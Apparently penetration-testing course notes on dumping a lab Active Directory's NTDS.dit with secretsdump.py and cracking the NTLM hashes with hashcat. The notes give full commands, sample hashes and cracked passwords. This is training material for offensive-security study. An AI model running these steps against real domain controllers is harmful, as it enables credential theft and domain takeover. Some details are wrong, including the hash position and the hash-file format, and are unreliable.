---

## 🗃️ Dumping the NTDS.dit

### 📝 Summary

The **NTDS.dit** file is a critical database used by Active Directory (AD) to store sensitive data, including **user accounts, group information, security descriptors, and password hashes**. By extracting this file, you can access hashed passwords for domain users and attempt to crack them using tools like `secretsdump.py` and `hashcat`. This guide provides a step-by-step process for dumping the NTDS.dit, isolating NTLM hashes, and cracking them to uncover user passwords.

### 📋 Detailed Notes

1. **What is NTDS.dit?**
    - The **NTDS.dit** is the central database file for **Active Directory**. It stores:
        - **User information**
        - **Group memberships**
        - **Security descriptors**
        - **Password hashes**
    - The goal of dumping the NTDS.dit is to extract these password hashes for further analysis and cracking.
2. **Using `secretsdump.py` to Dump the NTDS.dit:**
    - Run the `secretsdump.py` command to extract the NTDS.dit file from the domain controller:
        
        ```bash
        secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.164.138
        
        ```
        
    - **Output Analysis:**
        - The command will display various pieces of information, including:
            - **Local SAM hashes**
            - **Domain cached logon information**
            - **LSA secrets**
            - **NTDS.dit secrets** (what we're primarily interested in)
        - **Sample Output:**
            
            ```bash
            Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            MARVEL.local\\tstark:1105:aad3b435b51404eeaad3b435b51404ee:fc22339b7c3bba9541a10f599b84188d:::
            
            ```
            
        - The part after the second colon (`:`) represents the **NTLM hash**, which we need to extract for password cracking.
3. **Extracting Only NTLM Hashes:**
    - Use the `just-dc-ntlm` flag with `secretsdump.py` to extract only the NTLM hashes:
        
        ```bash
        secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.164.138 -just-dc-ntlm
        
        ```
        
    - This filters the output, displaying only the essential NTLM hashes needed for cracking:
        
        ```
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
        MARVEL.local\\tstark:1105:aad3b435b51404eeaad3b435b51404ee:fc22339b7c3bba9541a10f599b84188d:::
        
        ```
        
    - **Key Insight:** Focus on extracting **NTLM hashes** and ignore LM hashes, as NTLM is the more secure representation of the user's password.
4. **Preparing for Cracking:**
    - Copy the NTLM hashes into a text file named `ntds.txt` for cracking. For example:
        
        ```
        Administrator: 920ae267e048417fcfe00f49ecbd4b33
        MARVEL.local\\tstark: fc22339b7c3bba9541a10f599b84188d
        
        ```
        
5. **Cracking NTLM Hashes with `hashcat`:**
    - Use `hashcat` to crack the NTLM hashes using a wordlist (e.g., `rockyou.txt`):
        
        ```bash
        hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt
        
        ```
        
    - To see the cracked passwords:
        
        ```bash
        hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show
        
        ```
        
    - **Sample Output:**
        
        ```
        920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
        fc22339b7c3bba9541a10f599b84188d:IronMan123!
        
        ```
        
    - **Result:** You obtain a list of usernames with their corresponding passwords.
6. **End Results:**
    - The final output contains user credentials in plaintext, enabling further access within the domain:
        
        ```
        Administrator: P@$$w0rd!
        MARVEL.local\\tstark: IronMan123!
        
        ```
        

### 📖 Abbreviations & Definitions

- **NTDS.dit:** The database file used by Active Directory to store user accounts, group information, security descriptors, and password hashes.
- **NTLM Hash:** A cryptographic hash used to store Windows user passwords. More secure than the older LM hash, it's the main target for password cracking.
- **SAM Hash:** A hash stored in the Security Accounts Manager (SAM) file on a Windows system, representing local account passwords.
- **`secretsdump.py`:** A tool from the Impacket suite used to extract passwords, NTLM hashes, and other secrets from a Windows system.
- **`hashcat`:** A high-performance password recovery tool used to crack various types of hashes, including NTLM.

### 🚨 Critical Mentions & Exam Traps

- **🚨 Always Use the `just-dc-ntlm` Flag:** To focus on NTLM hashes, which are the target for cracking. Including other information can create unnecessary noise.
- **💡 Save the NTLM Hashes for Cracking:** Ensure you isolate only the NTLM part of the hash for use in `hashcat`.
- **🔄 Repeat the Cracking:** If initial cracking attempts fail, try different wordlists or attack modes in `hashcat` to maximize success.
- **⚠️ Exam Trap:** Do not overlook the format when saving hashes. The hash must be in the correct structure (i.e., username:hash) for `hashcat` to process correctly.

---